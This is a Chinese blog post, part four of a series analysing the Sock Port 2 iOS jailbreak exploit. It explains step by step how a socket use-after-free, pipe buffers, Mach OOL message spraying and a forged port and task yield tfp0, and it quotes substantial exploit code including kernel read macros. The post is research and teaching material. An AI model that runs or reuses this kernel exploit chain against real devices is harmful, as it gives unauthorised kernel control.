---
title: ' Sock Port 漏洞解析（四）The tfp0 !'
date: 2019-12-08 19:00:00
tags: ['Sock Port', 'UAF', 'tfp0']
---

# 系列文章
1. [iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying](https://juejin.im/post/5dd10660e51d453fac0a598d)
2. [iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address](https://juejin.im/post/5dd918d051882573180a2ba7)
3. [iOS Jailbreak Principles - Sock Port 漏洞解析（三）IOSurface Heap Spraying](https://juejin.im/post/5de37a236fb9a071b5615dea)

# 前言
通过前 3 篇文章我们已经掌握了通过 Sock Port 达到 tfp0 所需要的 Primitives，本文将带大家分析 Sock Port 利用上述 Primitives 实现 tfp0 的过程。

# 准备工作
本文只会对关键代码进行讲解，请大家自行打开 [Sock Port 2](https://github.com/jakeajames/sock_port/tree/sock_port_2) 中的 `exploit.c`，从 `get_tfp0` 函数入手结合本文进行分析。

# 步骤分解
首先我们将整个获得 tfp0 的步骤分解，给大家一个整体的认识。
1. 泄露进程自己的 `self_port_address`，进而获取以下内容；
    - `self_task_addresss`
    - `ipc_space_kernel`
2. 使用 pipe 函数分配一对进程通信管道句柄 `fds`，通过 `self_task_addresss` 包含的进程信息 `proc` 可以查询到 `fds` 句柄在内核中所分配缓冲区的实际地址 `pipe_buffer_address`；
    - 使用 pipe 可以分配出一对在进程之间读写的文件描述符，在读写的同时会在内核中分配相应的缓冲区
3. 使用上一篇文章中提到的 IOSurface Spraying 结合 Socket UAF 可以实现将 `pipe_buffer_address` 对应的内容释放，从而得到一个已释放的 `pipe_buffer`；
4. 创建一个有 send right 的 `mach port`，使用 OOL Message Spraying 将其填充到已释放的 `pipe_buffer`；
5. 此时内核会认为 `pipe_buffer` 中的都是合法 port，随后我们伪造一个 `fake port` 和对应的 `fake task`，然后将 `fake_port_address` 替换到 `pipe_buffer` 的前 8 个字节，这样我们就拿到了一个具有 send right 的 `ipc_port` 和 `task` 的控制权；
6. 接收之前的 OOL Message，我们会重新拿到执行 OOL Message Spraying 时使用的 ports，但 ports[0] 已经被篡改为我们的 `fake_port`，我们对其有完整的控制能力；
7. 通过操纵 `fake_port`，我们能够获得一个更加稳定的 Kernel Read Primitive，此后借助它枚举出内核进程，然后拿到内核的 `vm_map`；
8. 将内核的 `vm_map` 赋予 `fake port`，此时我们的 `fake port` 已经是一个完备的 kernel task port，tfp0 初步成立；
9. 用这个 tfp0 去创建一个更稳定的 tfp0，然后清理腐化的环境，消除后续的 Kernel Panic 隐患。

下面将详细讲解这些步骤中在前序文章中未提及的内容。

# SMAP 与 Pipe Buffer
## Supervisor Mode Access Prevention
PageSize 为 16KB 的 iPhone 7 及以上设备包含了被称之为 SMAP(Supervisor Mode Access Prevention) 的缓解措施，通过这项措施能够阻止内核直接访问 userland 内存，为二进制漏洞利用带来了一些限制。

根据 Wikipedia 上对 SMAP 的描述[1]：
> Supervisor Mode Access Prevention (SMAP) is a feature of some CPU implementations such as the Intel Broadwell microarchitecture that allows supervisor mode programs to optionally set user-space memory mappings so that access to those mappings from supervisor mode will cause a trap. This makes it harder for malicious programs to "trick" the kernel into using instructions or data from a user-space program.

即 SMAP 使得处于 Supervisor Mode 的程序（例如 Kernel）在访问用户空间内存时会触发异常，这使得我们在用户态 fake 的数据不能直接被内核访问。为了绕过这一限制，我们必须设法在内核中分配可控的区域。

## Pipe IO System Call
幸运的是操作系统提供了 Pipe IO System Call，根据 GeeksforGeeks 上对 Pipe 的描述[2]：
> Conceptually, a pipe is a connection between two processes, such that the standard output from one process becomes the standard input of the other process. In UNIX Operating System, Pipes are useful for communication between related processes(inter-process communication).

即 pipe 是两个进程间通信的管道，一个进程的标准输出将作为另一个进程的标准输入。使用 pipe 函数可以得到一对读写句柄 fds，如下图所示（图片来自 GeeksforGeeks）：

![图片来自 GeeksforGeeks](https://user-gold-cdn.xitu.io/2019/12/8/16ee467a2c9f3e84?w=392&h=239&f=png&s=27026)

使用 pipe 读写时，由于要实现跨进程共享内存，缓冲区会被分配到内核中，在用户态拿到的是 fd 句柄，而 fd 对应的缓冲区地址被记录在了任务端口上，基于已泄露的 `task port` 和前序文章中提到的 Kernel Read Primitive 即可拿到内核中的缓冲区地址。此时我们已经间接获得了一块内核中的可控区域，关键代码如下（省略了错误检查）：

```c
// here we'll create a pair of pipes (4 file descriptors in total)
// first pipe, used to overwrite a port pointer in a mach message
int fds[2];
ret = pipe(fds);
if (ret) {
    printf("[-] failed to create pipe\n");
    goto err;
}

// make the buffer of the first pipe 0x10000 bytes (this could be other sizes, but know that kernel does some calculations on how big this gets, i.e. when I made the buffer 20 bytes, it'd still go to kalloc.512
uint8_t pipebuf[0x10000];
memset(pipebuf, 0, 0x10000);

write(fds[1], pipebuf, 0x10000); // do write() to allocate the buffer on the kernel
read(fds[0], pipebuf, 0x10000); // do read() to reset buffer position
write(fds[1], pipebuf, 8); // write 8 bytes so later we can read the first 8 bytes (used to verify if spraying worked)
```

上述代码在内核中创建了一个大小为 64K 的缓冲区，需要注意的是 fd 的读写平衡，每次 write 操作都会将 cursor 向后移动，每次 read 操作都将把 cursor 向前移动。这里先通过一次平衡的读写在内核中创建了缓冲区，随后写入 8 字节，这是为了方便之后从中读回第一个 port，即我们的 fake port。

## 获取 Pipe Buffer Address
基于 `task port` 和 fd 句柄很容易就能拿到 pipe buffer 的地址，关键代码如下：
```c
self_port_addr = task_self_addr(); // port leak primitive
uint64_t task = rk64_check(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
self_task_addr = task;
uint64_t proc = rk64_check(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
self_proc_addr = proc;
uint64_t p_fd = rk64_check(proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));
uint64_t fd_ofiles = rk64_check(p_fd + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));

uint64_t fproc = rk64_check(fd_ofiles + fds[0] * 8);
uint64_t f_fglob = rk64_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
uint64_t fg_data = rk64_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
uint64_t pipe_buffer = rk64_check(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
printf("[*] pipe buffer: 0x%llx\n", pipe_buffer);
```

# Pipe Buffer UAF
我们的最终目的是控制一个 port，因此需要系统将 port 分配到我们的可控区域，即 pipe buffer 中，这样我们就能对其进行完全控制。这里我们将利用 Socket UAF 释放 Pipe Buffer，再利用 Mach OOL Message Spraying 将有效的 port 填充过来。

## Socket UAF Free Primitive
在前序文章中我们讲了利用 Socket UAF 实现的 Kernel Read，其实它还可以实现任意内核 Zone 的释放逻辑，这里的利用方式与之前提到的 Kernel Read 基本相同，也是把待处理的地址存储到 `fake options` 中的 `ip6po_pktinfo` 字段。区别在于 Spraying 成功后，我们不读取内容，而是给 `ip6po_pktinfo` 写一个全 0 的结构，这会导致 `ip6po_pktinfo` 指向的内容被释放。

按照常规的理解，释放 `ip6po_pktinfo` 指向的区域时，释放的区域长度应当以 `ip6po_pktinfo` 长度为准，但由内核中的代码得知这里使用了 FREE 函数，自动根据 zone 头部的 size 决定释放的长度，即以 `ip6po_pktinfo` 指向的区域为准，这就导致了一个任意长度区域释放的 Primitive，内核中的关键代码如下：
```c
void ip6_clearpktopts(struct ip6_pktopts *pktopt, int optname) {
    if (pktopt == NULL)
    	return;
    
    if (optname == -1 || optname == IPV6_PKTINFO) {
    	if (pktopt->ip6po_pktinfo)
    		FREE(pktopt->ip6po_pktinfo, M_IP6OPT); // <-- free
    	pktopt->ip6po_pktinfo = NULL;
    }
    // ...
```

它是对 `kfree_addr` 的封装，而 `kfree_addr` 中有基于地址获取到 zone 及 size 的逻辑：
```c
vm_size_t kfree_addr(void *addr) {
    vm_map_t map;
    vm_size_t size = 0;
    kern_return_t ret;
    zone_t z;
    
    size = zone_element_size(addr, &z); //
    if (size) {
    	DTRACE_VM3(kfree, vm_size_t, -1, vm_size_t, z->elem_size, void*, addr);
    	zfree(z, addr);
    	return size;
    }
    // ...
```

## Free the Pipe Buffer
利用上面的 Primitive，我们能够轻易地释放 Pipe Buffer：
```c
// free the first pipe buffer
ret = free_via_uaf(pipe_buffer);
```
此时我们已经达成了 Pipe Buffer UAF。

# Mach OOL Message Spraying
为了获得合法、可控的 `ipc_port`，我们使用 Mach OOL Message 进行 Heap Spraying，这里注意记录下 `remote port`，因为后续我们需要接收消息拿到被我们替换 port 的句柄：
```c
// create a new port, this one we'll use for tfp0
mach_port_t target = new_port();
// reallocate it while filling it with a mach message containing send rights to our target port
mach_port_t p = MACH_PORT_NULL;
for (int i = 0; i < 10000; i++) {
    // pipe is 0x10000 bytes so make 0x10000/8 pointers and save result as we'll use later
    p = fill_kalloc_with_port_pointer(target, 0x10000/8, MACH_MSG_TYPE_COPY_SEND);
    
    // check if spraying worked by reading first 8 bytes
    uint64_t addr;
    read(fds[0], &addr, 8);
    if (addr == target_addr) { // if we see the address of our port, it worked
        break;
    }
    write(fds[1], &addr, 8); // reset buffer position
    
    mach_port_destroy(mach_task_self(), p); // spraying didn't work, so free port
    p = MACH_PORT_NULL;
}
```

这里我们使用了与 Pipe Buffer 尺寸相同（0x10000）的消息，以便能够成功的将 port address 填充到 Pipe Buffer 中。

如何检查我们是否成功呢？只需要先拿到上述 target port 的地址，再从 Pipe Buffer 中读取 8B（由于之前我们预写了 8B，这里拿到的应该是第一个 port 的地址），如果 Spraying 成功 target port address 应当等于我们从 Pipe Buffer 中读到的地址。

# 伪造 port 与 task
## 另一个 pipe
上述填充到 Pipe Buffer 中的依然是用户态 port，并没有 tfp0 能力，我们需要篡改这个 port 以获得 tfp0。

由于 SMAP 的存在，我们的 fake port 与 fake task 都需要通过 pipe 拷贝到内核中才能被正常访问，因此我们需要再创建一个 pipe。

Sock Port 源码中这个部分十分巧妙，它在内核中分配了能容纳 port 与 task 的连续区域，然后让 port->task 指向与之相邻的 task 区域，这样我们就用一片区域同时控制了 port 与 task，又绕过了 SMAP，关键代码如下：
```c
int port_fds[2] = {-1, -1};
pipe(port_fds);

// create fake port and fake task, put fake_task right after fakeport
kport_t *fakeport = malloc(sizeof(kport_t) + 0x600);
ktask_t *fake_task = (ktask_t *)((uint64_t)fakeport + sizeof(kport_t));
bzero((void *)fakeport, sizeof(kport_t) + 0x600);

fake_task->ref_count = 0xff;

fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
fakeport->ip_references = 0xd00d;
fakeport->ip_lock.type = 0x11;
fakeport->ip_messages.port.receiver_name = 1;
fakeport->ip_messages.port.msgcount = 0;
fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
fakeport->ip_srights = 99;
fakeport->ip_kobject = 0;
fakeport->ip_receiver = ipc_space_kernel;

if (SMAP) {
    write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
    read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);
}

// 这里省略了获得 port_pipe_buffer 地址的代码

if (SMAP) {
    // align ip_kobject at our fake task, so the address of fake port + sizeof(kport_t)
    fakeport->ip_kobject = port_pipe_buffer + sizeof(kport_t);
}
else {
    fakeport->ip_kobject = (uint64_t)fake_task;
}
```
在 SMAP 下，内核中引用的地址不能来自 userland，因此上述关键代码底部的 task 指向的是 Pipe Buffer 中的空间。

## 偷梁换柱
接下来我们用 fake port 去替换 Pipe Buffer 中的第一个合法 port：
```c
if (SMAP) {
    // spraying worked, now the pipe buffer is filled with pointers to our target port
    // overwrite the first pointer with our second pipe buffer, which contains the fake port
    write(fds[1], &port_pipe_buffer, 8);
}
else {
    write(fds[1], &fakeport, 8);
}
```

同样注意，在 SMAP 模式下应当写入 `port_pipe_buffer` 的地址而不是 userland 的 fakeport 地址。此时我们已经将 fakeport 放到了合法的 port 区域，换句话说我们完全控制了一个 `ipc_port`。

# 接收 Mach OOL Message
由于 port 句柄包含了 rights 信息，我们的篡改会改变 Pipe Buffer 中第一个 port 的句柄，因此我们需要接收 OOL Message 来重新读到这个句柄，还记得之前记录下的 remote port 吗，我们可以通过它接收发送的 OOL Message：
```c
// receive the message from fill_kalloc_with_port_pointers back, since that message contains a send right and we overwrote the pointer of the first port, we now get a send right to the fake port!
struct ool_msg *msg = malloc(0x1000);
ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
if (ret) {
    free(msg);
    printf("[-] mach_msg() failed: %d (%s)\n", ret, mach_error_string(ret));
    goto err;
}

mach_port_t *received_ports = msg->ool_ports.address;
mach_port_t our_port = received_ports[0]; // fake port!
free(msg);
```

这里我们能拿到 fakeport 对应的 port 句柄，而不再是之前的 target port 句柄，这是因为内核在将 OOL Message 拷贝回用户空间时，会执行 `CAST_MACH_PORT_TO_NAME` 宏函数进行转换：
```c
#define CAST_MACH_PORT_TO_NAME(x) ((mach_port_name_t)(uintptr_t)(x))
```

它会截取 `ipc_port` 的头部 `ipc_object` 的 8B，即 `ipc_object` 中的前两个成员：
```c
struct ipc_port {
    struct ipc_object ip_object;
    struct ipc_mqueue ip_messages; 
    // ...
};

struct ipc_object {
    ipc_object_bits_t io_bits; // 4B
    ipc_object_refs_t io_references; // 4B
    lck_spin_t	io_lock_data;
};
```

因此最终 port 句柄实际上是由 `ipc_port` 中的 `io_bits` 和 `io_references` 的值组成的。

现在我们同时拥有了 `ipc_port` 的完全控制权及其句柄，但这个 `ipc_port` 缺少 `vm_map`，并不是一个合法的 task port，接下来我们需要将内核的 `vm_map` 赋予它。

# pid_for_task Kernel Read Primitive
`pid_for_task` 函数接收一个进程的 port 作为参数，并查询它的 pid 返回，它的实现原理如下：
```c
// 伪代码
int pid = get_ipc_port(port)->task->bsd_info->p_pid;
```
而结构体成员访问的本质是偏移量计算：
```c
int pid = *(*(*(get_ipc_port(port) + offset_task) + offset_bsd_info) + offset_pid)
```
由于我们有 fakeport 的控制权，我们可以修改它的 `bsd_info` 等于 `addr - offset_pid`，此时 `*(*(get_ipc_port(port) + offset_task) + offset_bsd_info) = addr - offset_pid`，此时上述公式有如下的等价表达：
```c
int pid = *(addr - offset_pid + offset_pid) = *addr
```
通过这种方式能稳定读取 addr 处的 4B 数据，进而实现一个完美的 Kernel Read Primitive：
```c
#define kr32(addr, value)\
    if (SMAP) {\
        read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);\
    }\
    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
    if (SMAP) {\
        write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);\
    }\
    value = 0x0;\
    ret = pid_for_task(our_port, (int *)&value);
```
首先通过 Pipe Buffer 修改 `bsd_info`，然后将 fakeport 的句柄传入 `pid_for_task`，即可读取到指定地址的 4B 数据。

通过组合多次 kr32 可以实现任意长度数据的 Kernel Read，例如下面的 kr64：
```c
#define kr64(addr, value)\
    kr32(addr + 0x4, read64_tmp);\
    kr32(addr, value);\
    value = value | ((uint64_t)read64_tmp << 32)
```

# 获取 kernel vm_map
基于当前进程的 `task_port` 可以枚举出所有进程，在这个过程中需要数百次的 Kernel Read，因此需要借助于上述稳定的 `pid_for_task Kernel Read Primitive`：
```c
uint64_t struct_task;
kr64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);
if (!struct_task) {
    printf("[-] kernel read failed!\n");
    goto err;
}

printf("[!] READING VIA FAKE PORT WORKED? 0x%llx\n", struct_task);
printf("[+] Let's steal that kernel task port!\n");

// tfp0!

uint64_t kernel_vm_map = 0;

while (struct_task != 0) {
    uint64_t bsd_info;
    kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
    if (!bsd_info) {
        printf("[-] kernel read failed!\n");
        goto err;
    }
    
    uint32_t pid;
    kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);
    
    if (pid == 0) {
        uint64_t vm_map;
        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);
        if (!vm_map) {
            printf("[-] kernel read failed!\n");
            goto err;
        }
        
        kernel_vm_map = vm_map;
        break;
    }
    
    kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV), struct_task);
}
```

由于 `proc` 是一个双向链表，我们可以从当前进程开始向前枚举，直至 pid=0，再从 kernel task 中取出 `vm_map`。

# 第一个 tfp0
将上述获取到的 `kernel vm_map` 写入 fakeport，现在我们有了一个合法的 `kernel task port`：
```c
read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);
    
fake_task->lock.data = 0x0;
fake_task->lock.type = 0x22;
fake_task->ref_count = 100;
fake_task->active = 1;
fake_task->map = kernel_vm_map;
*(uint32_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;

if (SMAP) {
    write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
}
```

此时我们应该已经拥有一个 tfp0 port，可以借助于 mach_vm 相关的内存函数予以验证。

# 稳定的 tfp0
上述 tfp0 是一个偷梁换柱而来的 task port，可能会埋下一些隐患。接下来我们可以用 tfp0 去创建一个合法、稳定、安全的 tfp0：
```c
mach_port_t new_tfp0 = new_port();
if (!new_tfp0) {
    printf("[-] failed to allocate new tfp0 port\n");
    goto err;
}

uint64_t new_addr = find_port(new_tfp0, self_port_addr);
if (!new_addr) {
    printf("[-] failed to find new tfp0 port address\n");
    goto err;
}

uint64_t faketask = kalloc(0x600);
if (!faketask) {
    printf("[-] failed to kalloc faketask\n");
    goto err;
}

kwrite(faketask, fake_task, 0x600);
fakeport->ip_kobject = faketask;

kwrite(new_addr, (const void*)fakeport, sizeof(kport_t));
```
这里先创建了一个具有 send rights 的 port，然后重新创建了一个区域来容纳 kernel task，这消除了之前 `ipc_port` 与 task 在 Port Pipe Buffer 中相邻从而带来的隐患。随后将 Port Pipe Buffer 中的 task 拷贝到新分配的 task 区域，再将 fakeport 数据完整拷贝到新创建的 port，由此我们得到了一个新的 tfp0。

# 环境清理
接下来我们将先前的 tfp0 port 从进程的 port 索引表中抹去，再将已释放的 Pipe Buffer 从 fd 索引表中抹去，最后关闭 IOSurfaceClient 与 pipe，释放 userland 临时分配的缓冲区：
```c
// clean up port
uint64_t task_addr = rk64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

uint32_t port_index = our_port >> 8;
const int sizeof_ipc_entry_t = 0x18;

wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);

wk64(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER), 0); // freed already via mach_msg()

if (fds[0] > 0)  close(fds[0]);
if (fds[1] > 0)  close(fds[1]);
if (port_fds[0] > 0)  close(port_fds[0]);
if (port_fds[1] > 0)  close(port_fds[1]);

free((void *)fakeport);
deinit_IOSurface();
```
到这里整个 Sock Port 利用就分析完了，我们拿到了稳定的 tfp0，距离 Jailbreak 又近了一步。

# 总结
本文梳理了 Sock Port 2 获得 tfp0 的整个过程，并对关键步骤进行了讲解，通过阅读本文能够对 Sock Port 在整体和细节上分别有深入的认识。

# 下节预告
到这里 Sock Port 漏洞解析就告一段落了，通过这个 Exploit 我们仅仅取得了 tfp0，距离 Jailbreak 还有很远的距离。接下来的文章将开始分析讲解 Undecimus Jailbreak 源码，讲解从 tfp0 到内核代码执行，再到各种 Kernel Patch。

<img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img>

# 参考资料
1. [Supervisor Mode Access Prevention. Wikipedia](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention)
2. [Pipe System Call. GeeksforGeeks](https://www.geeksforgeeks.org/pipe-system-call/)
3. [Sock Port 2. jakeajames](https://github.com/jakeajames/sock_port)